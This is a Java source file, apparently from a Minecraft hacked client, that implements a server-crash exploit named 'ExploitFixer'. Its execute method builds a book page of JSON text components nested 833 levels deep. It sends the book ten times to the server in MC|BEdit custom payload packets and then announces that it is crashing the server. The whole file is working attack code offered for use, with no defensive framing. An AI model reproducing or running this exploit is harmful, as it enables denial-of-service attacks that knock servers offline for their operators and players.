package pl.oucik.phecdateam.rebuild.exploit.impl.nbt;

import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;
import pl.oucik.phecdateam.rebuild.exception.ExploitException;
import pl.oucik.phecdateam.rebuild.exploit.*;
import pl.oucik.phecdateam.rebuild.exploit.argument.Argument;
import pl.oucik.phecdateam.rebuild.helper.ChatHelper;
import pl.oucik.phecdateam.rebuild.holder.ExploitHolder;

@ExploitInfo(
    name = "ExploitFixer",
    type = ExploitType.NBT

)
public class ExploitFixerExploit extends Exploit<ItemStack> {

  public ExploitFixerExploit() {
    super(() -> {
          ItemStack itemStack = new ItemStack(Items.written_book);
          NBTTagCompound compound = new NBTTagCompound();

          NBTTagList pages = new NBTTagList();
          pages.appendTag(new NBTTagString(ExploitHolder.getExtraJson()));

          compound.setString("author", RandomStringUtils.randomAlphabetic(10));
          compound.setString("title", RandomStringUtils.randomAlphabetic(10));
          compound.setByte("resolved", (byte) 1);
          compound.setTag("pages", pages);

          itemStack.setTagCompound(compound);

          return itemStack;
        },
        new Argument("packets", 0, Integer.class));
  }

  @Override
  public void execute(Object... args) throws ExploitException {
      final long start = System.currentTimeMillis();
      for (int f = 0; f < 10; ++f) {
          try {
              final NBTTagCompound tag = new NBTTagCompound();
              final NBTTagList list = new NBTTagList();
              String value = "";
              value += "{";
              final int bvalue = 833;
              for (int i = 0; i < bvalue; ++i) {
                  value += "extra:[{";
              }
              for (int i = 0; i < bvalue; ++i) {
                  value += "text:\u0645}],";
              }
              value += "text:\u0645}";
              list.appendTag(new NBTTagString(value));
              tag.setString("author", "str0ng");
              tag.setString("title", "VortexClient");
              tag.setByte("resolved", (byte)1);
              tag.setTag("pages", list);
              final ItemStack book = new ItemStack(Items.writable_book);
              book.setTagCompound(tag);
              final PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
              pb.writeItemStackToBuffer(book);
              Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload("MC|BEdit", pb));
              Thread.sleep(2000L);
          }
          catch (InterruptedException ex) {}
      }
      ChatHelper.printMessage(String.format("&C&LCrashing server with method &4&lExploitFixer"));

  }

}
